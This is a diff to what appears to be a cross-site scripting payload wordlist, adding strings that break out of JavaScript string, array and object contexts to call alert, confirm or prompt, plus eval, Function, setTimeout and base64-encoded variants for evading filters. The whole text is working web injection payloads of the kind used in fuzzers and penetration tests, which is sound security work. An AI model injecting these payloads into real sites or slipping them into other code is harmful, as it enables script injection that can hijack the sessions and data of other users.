@@ -9,3 +9,23 @@ a=1;a=eval;b=alert;a(b(11));//
 1];a=eval;b=alert;a(b(17));//
 1;a=eval;b=alert;a(b(/c/.source));
 xyz onerror=alert(6);
+alert(1)
+confirm(1)
+prompt(1)
+'+alert(1)+'
+"-alert(1)-"
+');alert(1);//'
+');alert(document.domain);//'
+';alert(1)//'
+"};alert(1);//"
+'};alert(1)//'
+0);alert(1);//0
+1];alert(1);//1
+true);alert(1);//true
+false||alert(1)// 
+foo = 'x';alert(1);// 
+a=eval;b=alert;a(b('1'));//
+Function('alert(1)')()
+setTimeout('alert(1)')
+";eval(atob('YWxlcnQoMSk='));//"
+
